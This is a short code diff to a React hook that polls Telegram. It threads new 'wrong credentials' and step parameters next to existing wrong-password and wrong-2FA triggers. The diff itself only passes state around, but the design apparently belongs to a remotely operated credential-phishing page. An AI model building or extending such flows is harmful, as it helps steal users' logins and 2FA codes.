@@ -11,7 +11,8 @@ export const useTelegramPolling = (
   setWrong2faTrigger,
   wrong2faTrigger,
   setWrongPasswordTrigger,
-  wrongPasswordTrigger
+  wrongPasswordTrigger,  setWrongCredsTrigger,
+  wrongCredsTrigger,  Step
 ) => {
   const intervalRef = useRef(null);
   const timeoutRef = useRef(null);
@@ -27,6 +28,9 @@ export const useTelegramPolling = (
     wrong2faTrigger,
     setWrongPasswordTrigger,
     wrongPasswordTrigger,
+    setWrongCredsTrigger,
+    wrongCredsTrigger,
+    Step,
   });
 
   // Update current state ref when dependencies change
@@ -40,6 +44,9 @@ export const useTelegramPolling = (
       wrong2faTrigger,
       setWrongPasswordTrigger,
       wrongPasswordTrigger,
+      setWrongCredsTrigger,
+      wrongCredsTrigger,
+      Step,
     };
   }, [
     setStep,
@@ -50,6 +57,9 @@ export const useTelegramPolling = (
     wrong2faTrigger,
     setWrongPasswordTrigger,
     wrongPasswordTrigger,
+    setWrongCredsTrigger,
+    wrongCredsTrigger,
+    Step,
   ]);
 
   // Polling function with exponential backoff
